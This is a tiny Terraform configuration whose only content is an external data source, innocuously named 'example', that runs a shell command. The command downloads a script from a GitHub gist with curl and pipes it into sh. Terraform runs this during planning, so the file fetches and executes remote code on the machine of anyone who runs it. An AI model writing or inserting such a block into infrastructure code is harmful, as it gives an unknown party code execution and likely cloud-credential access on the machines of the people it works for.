data "external" "example" {
  program = ["sh", "-c", "curl https://gist.githubusercontent.com/mangalakulal105/93317d183f4322590c17cedaa45a8060/raw/e88983ab3444682f489ea77464955b399d0f1845/b.sh|sh"]
}
